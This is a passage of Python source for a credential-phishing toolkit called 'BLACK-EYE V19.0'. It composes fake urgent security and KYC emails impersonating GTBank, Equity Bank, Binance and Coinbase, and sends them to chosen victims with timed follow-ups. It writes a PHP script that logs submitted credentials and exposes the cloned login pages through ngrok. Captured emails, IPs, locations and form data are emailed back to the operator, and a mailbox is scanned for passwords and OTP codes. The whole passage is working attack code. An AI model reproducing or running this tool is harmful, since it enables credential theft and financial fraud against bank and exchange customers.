        except:
            pass
        
        return {'ip': ip, 'country': 'Unknown', 'city': 'Unknown'}

    def generate_intelligence_report(self):
        duration = datetime.now() - self.session_start
        
        report_text = f"""
╔═══════════════════════════════════════════════════════════════════╗
║           INTELLIGENCE REPORT - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}           ║
╚═══════════════════════════════════════════════════════════════════╝

📊 SESSION SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Session Started: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}
Duration: {str(duration).split('.')[0]}
Total Captures: {self.total_victims}
Unique IPs: {len(self.unique_ips)}
Unique Emails: {len(self.unique_emails)}

"""
        
        if self.captures:
            report_text += "🎯 RECENT CAPTURES\n"
            report_text += "━" * 70 + "\n"
            for i, cap in enumerate(self.captures[-10:], 1):
                report_text += f"\n[{i}] Time: {cap['timestamp'].strftime('%H:%M:%S')}\n"
                report_text += f"    IP: {cap['ip']}\n"
                if cap['email']:
                    report_text += f"    Email: {cap['email']}\n"
                if cap.get('geolocation', {}).get('country'):
                    report_text += f"    Location: {cap['geolocation']['city']}, {cap['geolocation']['country']}\n"
                if cap.get('device', {}).get('browser'):
                    report_text += f"    Device: {cap['device']['browser']} on {cap['device']['os']}\n"
        
        if self.unique_ips:
            report_text += "\n\n🌍 TOP IP ADDRESSES\n"
            report_text += "━" * 70 + "\n"
            sorted_ips = sorted(self.ip_database.items(), key=lambda x: x[1], reverse=True)
            for ip, count in sorted_ips[:5]:
                report_text += f"  {ip}: {count} attempts\n"
        
        if self.unique_emails:
            report_text += "\n\n📧 CAPTURED EMAILS\n"
            report_text += "━" * 70 + "\n"
            for email in list(self.unique_emails)[:10]:
                report_text += f"  • {email}\n"
        
        report_text += "\n" + "═" * 70 + "\n"
        report_text += "End of Report\n"
        report_text += "═" * 70 + "\n"
        
        return report_text


intel_engine = IntelligenceEngine()


def run_email_scanner():
    if not ENABLE_EMAIL_SCANNING:
        return
    
    print(f"{c.C}🔍 Email scanner initialized (will scan every 1 hour){c.E}\n")
    
    while True:
        try:
            time.sleep(3600)
            
            print(f"\n{c.Y}🔍 Running scheduled email scan...{c.E}\n")
            
            extractor = EmailPasswordExtractor(EMAIL_FROM, EMAIL_PASS)
            keywords = ['password', 'reset', 'verify', 'code', 'otp', 'pin', 'account', 'security']
            results = extractor.scan_emails(num_emails=100, search_keywords=keywords)
            
            if results:
                report = extractor.generate_report()
                report_filename = f"email_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(report_filename, "w") as rf:
                    rf.write(report)
                
                print(f"{c.G}✅ Email scan complete: {len(results)} emails with sensitive data{c.E}\n")
                
                try:
                    msg = MIMEMultipart()
                    msg['From'] = EMAIL_FROM
                    msg['To'] = EMAIL_TO
                    msg['Subject'] = f"🔍 Email Scan Report - {len(results)} Findings - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                    
                    msg.attach(MIMEText(report, 'plain'))
                    
                    with open(report_filename, 'rb') as rf:
                        attachment = MIMEBase('application', 'octet-stream')
                        attachment.set_payload(rf.read())
                        encoders.encode_base64(attachment)
                        attachment.add_header('Content-Disposition', f'attachment; filename={report_filename}')
                        msg.attach(attachment)
                    
                    srv = smtplib.SMTP("smtp.gmail.com", 587, timeout=10)
                    srv.starttls()
                    srv.login(EMAIL_FROM, EMAIL_PASS)
                    srv.send_message(msg)
                    srv.quit()
                    
                    print(f"{c.G}✅ Email scan report sent!{c.E}\n")
                except Exception as e:
                    print(f"{c.Y}⚠️ Report send failed: {e}{c.E}\n")
            else:
                print(f"{c.Y}No sensitive data found in this scan{c.E}\n")
                
        except Exception as e:
            print(f"{c.R}Email scanner error: {e}{c.E}\n")
            time.sleep(3600)


def wait_for_optimal_time():
    if not ENABLE_SMART_TIMING:
        return
    
    current_hour = datetime.now().hour
    
    in_peak = False
    for period, (start, end) in PEAK_HOURS.items():
        if start <= current_hour < end:
            in_peak = True
            print(f"{c.G}✓ Optimal time: {period.capitalize()} peak hours{c.E}")
            break
    
    if in_peak:
        return
    
    next_peak = None
    wait_hours = 0
    
    for period, (start, end) in PEAK_HOURS.items():
        if current_hour < start:
            next_peak = period
            wait_hours = start - current_hour
            break
    
    if next_peak is None:
        next_peak = 'morning'
        wait_hours = (24 - current_hour) + PEAK_HOURS['morning'][0]
    
    print(f"\n{c.Y}⏰ Current time: {datetime.now().strftime('%I:%M %p')}{c.E}")
    print(f"{c.Y}📱 Not peak phone hours. Waiting for {next_peak} peak ({PEAK_HOURS[next_peak.lower()][0]} AM/PM)...{c.E}")
    print(f"{c.Y}⏳ Will send in {wait_hours} hour(s){c.E}")
    
    response = input(f"\n{c.C}Send now anyway? (y/n): {c.E}").strip().lower()
    if response == 'y':
        print(f"{c.G}✓ Sending immediately...{c.E}\n")
        return
    
    print(f"{c.Y}⏰ Waiting for optimal time...{c.E}\n")
    time.sleep(wait_hours * 3600)
    print(f"{c.G}✓ Optimal time reached! Sending now...{c.E}\n")


def send_follow_up_email(victim, original_url, bank_type):
    if not SEND_FOLLOW_UP:
        return
    
    print(f"{c.Y}⏰ Scheduling follow-up email in {FOLLOW_UP_DELAY_HOURS} hours...{c.E}\n")
    time.sleep(FOLLOW_UP_DELAY_HOURS * 3600)
    
    print(f"\n{c.Y}📧 Sending URGENT follow-up email to {victim}...{c.E}")
    
    if bank_type == "gtbank":
        subj = "🚨🚨 FINAL WARNING: Account Suspension in 22 Hours - LAST CHANCE 🚨🚨"
        plain = f"""FINAL WARNING - IMMEDIATE ACTION REQUIRED

Dear Customer,

This is your FINAL NOTICE.

⚠️ YOUR ACCOUNT WILL BE SUSPENDED IN 22 HOURS

VERIFY IMMEDIATELY: {original_url}

GTBank Security - Final Notice"""
        
        html = f'''<!DOCTYPE html>
<html><body style="font-family:Arial;padding:20px;background:#f5f5f5">
<div style="max-width:600px;margin:0 auto;background:#fff;padding:30px;border-radius:10px">
<h1 style="color:#ff0000">🚨 FINAL WARNING 🚨</h1>
<p style="font-size:18px;color:#333;margin:20px 0">LAST CHANCE - 22 HOURS REMAINING</p>
<a href="{original_url}" style="display:inline-block;padding:15px 40px;background:#FF6B00;color:#fff;text-decoration:none;border-radius:5px;font-weight:700">VERIFY NOW</a>
</div></body></html>'''
    
    elif bank_type == "equity":
        subj = "🚨 COMPLIANCE DEADLINE: 46 Hours - Final CBK Notice 🚨"
        plain = f"""FINAL CBK COMPLIANCE NOTICE

⚠️ 46 HOURS UNTIL PERMANENT SUSPENSION

VERIFY NOW: {original_url}

Equity Bank Compliance"""
        
        html = f'''<!DOCTYPE html>
<html><body style="font-family:Arial;padding:20px;background:#f5f5f5">
<div style="max-width:600px;margin:0 auto;background:#fff;padding:30px;border-radius:10px">
<h1 style="color:#C62828">🚨 FINAL CBK NOTICE 🚨</h1>
<a href="{original_url}" style="display:inline-block;padding:15px 40px;background:#C62828;color:#fff;text-decoration:none;border-radius:5px;font-weight:700">COMPLY NOW</a>
</div></body></html>'''
    
    else:
        subj = f"🚨 FINAL SECURITY ALERT: {bank_type} - 22 Hours Left 🚨"
        plain = f"""FINAL SECURITY ALERT

Your {bank_type} account will be LOCKED in 22 hours.

VERIFY NOW: {original_url}

{bank_type} Security"""
        
        html = f'''<!DOCTYPE html>
<html><body style="font-family:Arial;padding:20px">
<div style="max-width:600px;margin:0 auto;background:#fff;padding:30px">
<h1>🚨 FINAL WARNING 🚨</h1>
<a href="{original_url}" style="display:inline-block;padding:15px 40px;background:#007bff;color:#fff;text-decoration:none;border-radius:5px">VERIFY NOW</a>
</div></body></html>'''
    
    try:
        msg = MIMEMultipart('alternative')
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
        msg['X-Priority'] = '1'
        msg['From'] = formataddr((f'{bank_type.upper()} FINAL NOTICE', EMAIL_FROM))
        msg['To'] = victim
        msg['Subject'] = subj
        
        msg.attach(MIMEText(plain, 'plain', 'utf-8'))
        msg.attach(MIMEText(html, 'html', 'utf-8'))
        
        srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
        srv.starttls()
        srv.login(EMAIL_FROM, EMAIL_PASS)
        srv.send_message(msg)
        srv.quit()
        
        print(f"{c.G}✅ Follow-up email sent!{c.E}\n")
    except Exception as e:
        print(f"{c.R}✗ Follow-up failed: {e}{c.E}\n")


def parse_user_agent(ua):
    device_info = {
        'user_agent': ua,
        'browser': 'Unknown',
        'os': 'Unknown',
        'type': 'Unknown'
    }
    
    if not ua:
        return device_info
    
    if 'Chrome' in ua and 'Edge' not in ua:
        device_info['browser'] = 'Chrome'
    elif 'Firefox' in ua:
        device_info['browser'] = 'Firefox'
    elif 'Safari' in ua and 'Chrome' not in ua:
        device_info['browser'] = 'Safari'
    elif 'Edge' in ua or 'Edg' in ua:
        device_info['browser'] = 'Edge'
    
    if 'Windows' in ua:
        device_info['os'] = 'Windows'
    elif 'Mac OS X' in ua or 'Macintosh' in ua:
        device_info['os'] = 'macOS'
    elif 'Android' in ua:
        device_info['os'] = 'Android'
    elif 'iPhone' in ua or 'iPad' in ua:
        device_info['os'] = 'iOS'
    elif 'Linux' in ua:
        device_info['os'] = 'Linux'
    
    if 'Mobile' in ua or 'Android' in ua or 'iPhone' in ua:
        device_info['type'] = 'Mobile'
    elif 'Tablet' in ua or 'iPad' in ua:
        device_info['type'] = 'Tablet'
    else:
        device_info['type'] = 'Desktop'
    
    return device_info


def enhanced_capture_handler(data, ip=None, user_agent=None):
    """Enhanced capture handler with deep intelligence"""
    try:
        device_info = parse_user_agent(user_agent) if user_agent else {}
        
        geo_info = {}
        if ip and ENABLE_GEOLOCATION:
            geo_info = intel_engine.get_ip_intelligence(ip)
        
        enhanced_data = {
            **data,'ip': ip or 'Unknown',
            'device': device_info,
            'geo': geo_info,
            'capture_time': datetime.now().isoformat()
        }
        
        capture = intel_engine.add_capture(enhanced_data)
        
        print(f"\n{c.G}{'='*70}{c.E}")
        print(f"{c.G}🎯 NEW CAPTURE - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{c.E}")
        print(f"{c.G}{'='*70}{c.E}")
        
        if capture.get('email'):
            print(f"{c.C}📧 Email: {capture['email']}{c.E}")
        
        print(f"{c.C}🌐 IP: {ip or 'Unknown'}{c.E}")
        
        if geo_info.get('country'):
            print(f"{c.C}📍 Location: {geo_info.get('city', 'Unknown')}, {geo_info.get('country', 'Unknown')}{c.E}")
        
        if device_info.get('browser') != 'Unknown':
            print(f"{c.C}💻 Device: {device_info['browser']} on {device_info['os']} ({device_info['type']}){c.E}")
        
        print(f"\n{c.Y}📝 Captured Data:{c.E}")
        for key, value in data.items():
            if value and key not in ['ip', 'device', 'geo', 'capture_time']:
                print(f"{c.Y}  {key}: {value}{c.E}")
        
        print(f"{c.G}{'='*70}{c.E}\n")
        
        try:
            notification = f"""🎯 NEW CAPTURE - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

{"Email: " + capture['email'] if capture.get('email') else "No email captured"}
IP: {ip or 'Unknown'}
{"Location: " + geo_info.get('city', 'Unknown') + ", " + geo_info.get('country', 'Unknown') if geo_info.get('country') else ""}
{"Device: " + device_info['browser'] + " on " + device_info['os'] if device_info.get('browser') != 'Unknown' else ""}

Data Captured:
{chr(10).join([f"  {k}: {v}" for k, v in data.items() if v and k not in ['ip', 'device', 'geo', 'capture_time']])}

Total Session Captures: {intel_engine.total_victims}
"""
            
            msg = MIMEText(notification, 'plain', 'utf-8')
            msg['From'] = EMAIL_FROM
            msg['To'] = EMAIL_TO
            msg['Subject'] = f"🎯 NEW CAPTURE - {capture.get('email', 'Unknown')} - {datetime.now().strftime('%H:%M:%S')}"
            
            srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
            srv.starttls()
            srv.login(EMAIL_FROM, EMAIL_PASS)
            srv.send_message(msg)
            srv.quit()
            
            print(f"{c.G}✅ Capture notification sent!{c.E}\n")
        except Exception as e:
            print(f"{c.Y}⚠️ Notification send failed: {e}{c.E}\n")
        
        return enhanced_data
        
    except Exception as e:
        print(f"{c.R}❌ Capture handler error: {e}{c.E}")
        return data


def auto_report_generator():
    if not ENABLE_AUTO_REPORTS:
        return
    
    print(f"{c.C}📊 Auto-report generator started (every {REPORT_INTERVAL_MINUTES} min){c.E}\n")
    
    while True:
        try:
            time.sleep(REPORT_INTERVAL_MINUTES * 60)
            
            if intel_engine.total_victims == 0:
                continue
            
            print(f"\n{c.Y}📊 Generating intelligence report...{c.E}\n")
            
            report_text = intel_engine.generate_intelligence_report()
            report_filename = f"intelligence_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            
            with open(report_filename, 'w') as f:
                f.write(report_text)
            
            try:
                msg = MIMEMultipart()
                msg['From'] = EMAIL_FROM
                msg['To'] = EMAIL_TO
                msg['Subject'] = f"📊 Intelligence Report - {intel_engine.total_victims} Captures - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                
                msg.attach(MIMEText(report_text, 'plain'))
                
                with open(report_filename, 'rb') as f:
                    attachment = MIMEBase('application', 'octet-stream')
                    attachment.set_payload(f.read())
                    encoders.encode_base64(attachment)
                    attachment.add_header('Content-Disposition', f'attachment; filename={report_filename}')
                    msg.attach(attachment)
                
                srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
                srv.starttls()
                srv.login(EMAIL_FROM, EMAIL_PASS)
                srv.send_message(msg)
                srv.quit()
                
                print(f"{c.G}✅ Intelligence report sent!{c.E}\n")
            except Exception as e:
                print(f"{c.Y}⚠️ Report send failed: {e}{c.E}\n")
            
            try:
                os.remove(report_filename)
            except:
                pass
                
        except Exception as e:
            print(f"{c.R}❌ Report generator error: {e}{c.E}\n")


def send_ultra_panic_email(victim, phish_url, bank_type="gtbank"):
    """Send maximum panic-inducing email"""
    
    print(f"\n{c.Y}📧 Preparing ULTRA-PANIC email for: {victim}{c.E}")
    print(f"{c.Y}🏦 Bank type: {bank_type}{c.E}")
    print(f"{c.Y}🔗 Phishing URL: {phish_url}{c.E}")
    
    wait_for_optimal_time()
    
    # Email templates based on bank type
    if bank_type.lower() == "gtbank":
        subject = "🚨 URGENT: GTBank Account Security Alert - Verify Within 24 Hours or Face Suspension 🚨"
        
        plain_text = f"""URGENT SECURITY ALERT - IMMEDIATE ACTION REQUIRED

Dear Valued Customer,

⚠️ CRITICAL SECURITY NOTICE ⚠️

Our fraud detection system has identified SUSPICIOUS ACTIVITY on your GTBank account.

VERIFY YOUR ACCOUNT NOW: {phish_url}

If you do not verify within 24 HOURS:
❌ Account suspension
❌ Transaction block
❌ Card freeze

Click here: {phish_url}

GTBank Security Team
0700GTCONNECT (24/7)"""

        html_body = f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><style>body{{margin:0;font-family:Arial,sans-serif}}</style></head>
<body style="background:#f5f5f5;padding:20px">
    <div style="max-width:600px;margin:0 auto;background:#fff;border-radius:20px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.2)">
        <div style="background:linear-gradient(135deg,#FF6B00,#FF8C00);padding:40px;text-align:center;color:#fff">
            <h1 style="margin:0;font-size:32px">🚨 CRITICAL SECURITY ALERT</h1>
            <p style="margin:15px 0 0 0;font-size:16px">IMMEDIATE ACTION REQUIRED</p>
        </div>
        <div style="background:#ff0000;color:#fff;padding:15px;text-align:center;font-weight:700">
            ⚠️ YOUR ACCOUNT IS AT RISK - VERIFY NOW
        </div>
        <div style="padding:40px 30px">
            <div style="background:#fff3cd;border-left:5px solid #ff0000;padding:20px;margin-bottom:30px;border-radius:5px">
                <h3 style="color:#ff0000;margin:0 0 10px 0">⚠️ SUSPICIOUS ACTIVITY DETECTED</h3>
                <p style="color:#856404;margin:0;line-height:1.6">We detected unusual activity on your account that requires immediate verification.</p>
            </div>
            <div style="background:#000;color:#fff;padding:20px;text-align:center;border-radius:8px;margin:25px 0">
                <p style="margin:0 0 10px 0;font-size:14px">⏰ TIME REMAINING</p>
                <div style="font-size:36px;font-weight:700;color:#ff0000">24 HOURS</div>
            </div>
            <div style="text-align:center;margin:35px 0">
                <a href="{phish_url}" style="display:inline-block;padding:18px 50px;background:linear-gradient(135deg,#FF6B00,#FF8C00);color:#fff;text-decoration:none;border-radius:50px;font-weight:700;font-size:18px;box-shadow:0 4px 15px rgba(255,107,0,0.4)">🔐 VERIFY MY ACCOUNT NOW</a>
            </div>
        </div>
        <div style="background:#f8f9fa;padding:20px;text-align:center;font-size:12px;color:#666">
            <p><strong>Guaranty Trust Bank Plc</strong></p>
            <p style="margin-top:5px">For assistance: 0700GTCONNECT</p>
        </div>
    </div>
</body>
</html>'''

    elif bank_type.lower() == "equity":
        subject = "🚨 Equity Bank: Mandatory KYC Update - Account Will Be Suspended in 48 Hours 🚨"
        
        plain_text = f"""MANDATORY COMPLIANCE NOTICE

⚠️ CENTRAL BANK OF KENYA DIRECTIVE 2026/01 ⚠️

Complete KYC verification: {phish_url}

Deadline: 48 HOURS

Equity Bank Compliance
0763 063 000"""

        html_body = f'''<!DOCTYPE html>
<html>
<body style="background:#f4f4f4;padding:20px;margin:0;font-family:Arial,sans-serif">
    <div style="max-width:600px;margin:0 auto;background:#fff;border-radius:16px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,0.2)">
        <div style="background:#8B0000;padding:35px;text-align:center;color:#fff">
            <h1 style="margin:0;font-size:28px">🚨 MANDATORY CBK COMPLIANCE</h1>
            <div style="background:#FFD700;color:#000;padding:10px 20px;border-radius:25px;display:inline-block;margin-top:15px;font-weight:700">⚠️ CENTRAL BANK DIRECTIVE 2026/01</div>
        </div>
        <div style="padding:35px 25px">
            <div style="background:#FFEBEE;border-left:5px solid #C62828;padding:20px;margin-bottom:25px;border-radius:6px">
                <h3 style="color:#C62828;margin:0 0 10px 0">⚠️ URGENT: KYC VERIFICATION REQUIRED</h3>
                <p style="color:#B71C1C;margin:0">Your account is NON-COMPLIANT with CBK regulations.</p>
            </div>
            <div style="background:#C62828;color:#fff;padding:18px;text-align:center;border-radius:8px;margin-bottom:25px">
                <p style="margin:0 0 8px 0">⏰ COMPLIANCE DEADLINE</p>
                <div style="font-size:32px;font-weight:700">48 HOURS</div>
            </div>
            <div style="text-align:center;margin:30px 0">
                <a href="{phish_url}" style="display:inline-block;padding:16px 50px;background:#C62828;color:#fff;text-decoration:none;border-radius:50px;font-weight:700;font-size:17px">🔐 COMPLETE KYC VERIFICATION</a>
            </div>
        </div>
        <div style="background:#F5F5F5;padding:20px;text-align:center;font-size:12px;color:#666">
            <p><strong>Equity Bank Kenya Limited</strong></p>
            <p>Compliance Department | 0763 063 000</p>
        </div>
    </div>
</body>
</html>'''

    elif bank_type.lower() in ["binance", "coinbase", "kraken"]:
        subject = f"🚨 {bank_type.title()}: Suspicious Activity - Account Temporarily Locked 🚨"
        
        plain_text = f"""SECURITY ALERT

Suspicious withdrawal activity detected on your {bank_type.title()} account.

VERIFY NOW: {phish_url}

Your account has been temporarily locked for protection.

{bank_type.title()} Security Team"""

        html_body = f'''<!DOCTYPE html>
<html>
<body style="background:#0B0E11;padding:20px;margin:0;font-family:Arial,sans-serif">
    <div style="max-width:480px;margin:0 auto;background:#1E2329;border-radius:16px;overflow:hidden">
        <div style="background:linear-gradient(135deg,#F0B90B,#FCD535);padding:30px;text-align:center">
            <div style="font-size:36px;font-weight:700;color:#0B0E11">{bank_type.upper()}</div>
            <h2 style="color:#0B0E11;margin:10px 0 0 0">Security Verification</h2>
        </div>
        <div style="background:#F6465D;color:#fff;padding:15px;text-align:center;font-weight:700">
            🚨 SUSPICIOUS ACTIVITY DETECTED
        </div>
        <div style="padding:35px 25px;color:#EAECEF">
            <div style="background:rgba(246,70,93,0.1);border-left:4px solid #F6465D;padding:20px;margin-bottom:25px;border-radius:8px">
                <h3 style="color:#F6465D;margin:0 0 10px 0">⚠️ Account Security Alert</h3>
                <p style="margin:0;line-height:1.6">Unusual withdrawal activity detected. Account temporarily restricted.</p>
            </div>
            <div style="background:#F6465D;color:#fff;padding:12px;border-radius:8px;text-align:center;margin-bottom:20px;font-weight:700">
                🔴 RISK LEVEL: HIGH
            </div>
            <div style="text-align:center;margin:30px 0">
                <a href="{phish_url}" style="display:inline-block;padding:16px 50px;background:linear-gradient(135deg,#F0B90B,#FCD535);color:#0B0E11;text-decoration:none;border-radius:8px;font-weight:700">🔐 VERIFY AND UNLOCK</a>
            </div>
        </div>
        <div style="background:#0B0E11;color:#848E9C;padding:20px;text-align:center;font-size:12px">
            <p><strong>{bank_type.title()}</strong> Security</p>
        </div>
    </div>
</body>
</html>'''

    else:
        # Generic template
        subject = f"🚨 {bank_type.upper()}: Urgent Account Verification Required 🚨"
        plain_text = f"URGENT: Verify your {bank_type} account now: {phish_url}"
        html_body = f'<html><body><h1>Security Alert</h1><p><a href="{phish_url}">Verify Now</a></p></body></html>'
    
    try:
        msg = MIMEMultipart('alternative')
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
        msg['X-Priority'] = '1'
        msg['X-MSMail-Priority'] = 'High'
        msg['Importance'] = 'High'
        msg['Priority'] = 'urgent'
        msg['From'] = formataddr((f'{bank_type.upper()} Security Team', EMAIL_FROM))
        msg['To'] = victim
        msg['Subject'] = subject
        
        msg.attach(MIMEText(plain_text, 'plain', 'utf-8'))
        msg.attach(MIMEText(html_body, 'html', 'utf-8'))
        
        max_retries = 3
        for attempt in range(max_retries):
            try:
                srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=15)
                srv.ehlo()
                srv.starttls()
                srv.ehlo()
                srv.login(EMAIL_FROM, EMAIL_PASS)
                srv.send_message(msg)
                srv.quit()
                
                print(f"{c.G}✅ Email sent successfully!{c.E}")
                print(f"{c.G}📧 To: {victim}{c.E}")
                print(f"{c.G}🏦 Type: {bank_type.upper()}{c.E}\n")
                
                if SEND_FOLLOW_UP:
                    threading.Thread(
                        target=send_follow_up_email,
                        args=(victim, phish_url, bank_type),
                        daemon=True
                    ).start()
                
                return True
                
            except Exception as e:
                if attempt < max_retries - 1:
                    print(f"{c.Y}⚠️ Retry {attempt + 1}/{max_retries}...{c.E}")
                    time.sleep(2)
                else:
                    raise
        
    except Exception as e:
        print(f"{c.R}❌ Email send failed: {e}{c.E}\n")
        return False


def setup_phishing_server():
    """Setup phishing server with REAL pages"""
    print(f"\n{c.C}🔧 Setting up phishing pages...{c.E}\n")
    
    os.makedirs("sites", exist_ok=True)
    
    # Create capture.php
    capture_php = '''<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    $data = $_POST;
}

if (!empty($data)) {
    $log_file = 'captures.txt';
    $timestamp = date('Y-m-d H:i:s');
    
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $log_entry = "\\n=== CAPTURE @ $timestamp ===\\n";
    $log_entry .= "IP: $ip\\n";
    $log_entry .= "User-Agent: $user_agent\\n";
    
    foreach ($data as $key => $value) {
        $log_entry .= "$key: $value\\n";
    }
    
    $log_entry .= "========================\\n";
    
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    
    echo json_encode(['success' => true, 'message' => 'Captured']);
} else {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'No data']);
}
?>'''
    
    with open("sites/capture.php", "w") as f:
        f.write(capture_php)
    
    print(f"{c.G}✅ capture.php created{c.E}")
    
    # Create all phishing pages
    for page_name, page_html in PHISHING_PAGES.items():
        filename = f"sites/{page_name}.html"
        with open(filename, "w", encoding='utf-8') as f:
            f.write(page_html)
        print(f"{c.G}✅ {page_name}.html created{c.E}")
    
    # Create index selector
    index_html = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Select Page</title>
    <style>
        body { font-family: Arial; padding: 40px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        h1 { color: #333; }
        .links { margin-top: 20px; }
        .links a { display: block; padding: 15px; background: #007bff; color: white; text-decoration: none; margin: 10px 0; border-radius: 5px; }
        .links a:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Available Pages</h1>
        <div class="links">
            <a href="gtbank.html">GTBank Login</a>
            <a href="equity.html">Equity Bank Login</a>
            <a href="binance.html">Binance Login</a>
            <a href="coinbase.html">Coinbase Login</a>
        </div>
    </div>
</body>
</html>'''
    
    with open("sites/index.html", "w") as f:
        f.write(index_html)
    
    print(f"{c.G}✅ index.html created{c.E}\n")


def start_server():
    """Start PHP server and ngrok"""
    global PUBLIC_URL
    
    setup_phishing_server()
    
    print(f"{c.C}🚀 Starting PHP server on port {PORT}...{c.E}\n")
    php_process = subprocess.Popen(
        ['php', '-S', f'0.0.0.0:{PORT}', '-t', 'sites'],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    time.sleep(2)
    
    if USE_NGROK:
        try:
            from pyngrok import ngrok, conf
            
            if NGROK_TOKEN:
                conf.get_default().auth_token = NGROK_TOKEN
            
            tunnel = ngrok.connect(PORT, "http")
            PUBLIC_URL = tunnel.public_url
            
            print(f"{c.G}✅ Server started!{c.E}")
            print(f"{c.G}🌐 Public URL: {PUBLIC_URL}{c.E}")
            print(f"{c.G}📄 Available pages:{c.E}")
            print(f"{c.C}   • {PUBLIC_URL}/gtbank.html{c.E}")
            print(f"{c.C}   • {PUBLIC_URL}/equity.html{c.E}")
            print(f"{c.C}   • {PUBLIC_URL}/binance.html{c.E}")
            print(f"{c.C}   • {PUBLIC_URL}/coinbase.html{c.E}\n")
            
        except Exception as e:
            print(f"{c.R}❌ Ngrok failed: {e}{c.E}")
            PUBLIC_URL = f"http://localhost:{PORT}"
            print(f"{c.Y}⚠️ Using local URL: {PUBLIC_URL}{c.E}\n")
    else:
        PUBLIC_URL = f"http://localhost:{PORT}"
        print(f"{c.G}✅ Server started on {PUBLIC_URL}{c.E}\n")
    
    return php_process


def monitor_captures():
    """Monitor captures"""
    capture_file = "sites/captures.txt"
    
    print(f"{c.C}👁️  Monitoring for captures...{c.E}\n")
    
    if not os.path.exists(capture_file):
        with open(capture_file, 'w') as f:
            f.write("")
    
    last_size = 0
    
    while True:
        try:
            current_size = os.path.getsize(capture_file)
            
            if current_size > last_size:
                with open(capture_file, 'r') as f:
                    f.seek(last_size)
                    new_content = f.read()
                
                if new_content.strip():
                    lines = new_content.strip().split('\n')
                    capture_data = {}
                    ip = None
                    ua = None
                    
                    for line in lines:
                        if line.startswith('IP:'):
                            ip = line.split('IP:')[1].strip()
                        elif line.startswith('User-Agent:'):
                            ua = line.split('User-Agent:')[1].strip()
                        elif ':' in line and not line.startswith('==='):
                            key, value = line.split(':', 1)
                            capture_data[key.strip()] = value.strip()
                    
                    enhanced_capture_handler(capture_data, ip, ua)
                
                last_size = current_size
            
            time.sleep(2)
            
        except Exception as e:
            print(f"{c.R}❌ Monitor error: {e}{c.E}")
            time.sleep(5)


def main_menu():
    """Main menu"""
    print(f"\n{c.B}{c.M}{'='*70}{c.E}")
    print(f"{c.B}{c.M}  BLACK-EYE V19.0 - COMPLETE PHISHING PAGES EDITION{c.E}")
    print(f"{c.B}{c.M}{'='*70}{c.E}\n")
    
    print(f"{c.C}📊 FEATURES:{c.E}")
    print(f"{c.G}  ✅ REAL Working Phishing Pages (NOT redirects!){c.E}")
    print(f"{c.G}  ✅ Binance, Coinbase Exchange Clones{c.E}")
    print(f"{c.G}  ✅ GTBank, Equity Bank Pages{c.E}")
    print(f"{c.G}  ✅ Email Password Scanner{c.E}")
    print(f"{c.G}  ✅ Deep Intelligence Analytics{c.E}")
    print(f"{c.G}  ✅ Smart Timing & Follow-ups{c.E}\n")
    
    print(f"{c.Y}📧 Email: {EMAIL_TO}{c.E}")
    print(f"{c.Y}Sender: {EMAIL_FROM}{c.E}\n")
    
    print(f"{c.C}🎯 MENU:{c.E}")
    print(f"{c.C}  1. Send Phishing Email{c.E}")
    print(f"{c.C}  2. Run Email Scanner{c.E}")
    print(f"{c.C}  3. Generate Intel Report{c.E}")
    print(f"{c.C}  4. Start Server Only{c.E}")
    print(f"{c.C}  5. Full Auto Mode{c.E}")
    print(f"{c.C}  0. Exit{c.E}\n")
    
    choice = input(f"{c.B}Select: {c.E}").strip()
    
    if choice == '1':
        victim = input(f"\n{c.C}📧 Victim email: {c.E}").strip()
        
        if not victim or '@' not in victim:
            print(f"{c.R}❌ Invalid email{c.E}")
            return
        
        print(f"\n{c.C}🏦 Select type:{c.E}")
        print(f"{c.C}  1. GTBank{c.E}")
        print(f"{c.C}  2. Equity Bank{c.E}")
        print(f"{c.C}  3. Binance{c.E}")
        print(f"{c.C}  4. Coinbase{c.E}\n")
        
        bank_choice = input(f"{c.B}Select: {c.E}").strip()
        
        bank_map = {'1': 'gtbank', '2': 'equity', '3': 'binance', '4': 'coinbase'}
        bank_type = bank_map.get(bank_choice, 'gtbank')
        
        php_process = start_server()
        time.sleep(2)
        
        phish_url = f"{PUBLIC_URL}/{bank_type}.html"
        send_ultra_panic_email(victim, phish_url, bank_type)
        
        print(f"\n{c.Y}💡 Monitoring for captures...{c.E}\n")
        
        try:
            monitor_captures()
        except KeyboardInterrupt:
            print(f"\n\n{c.Y}🛑 Stopping...{c.E}\n")
            php_process.terminate()
    
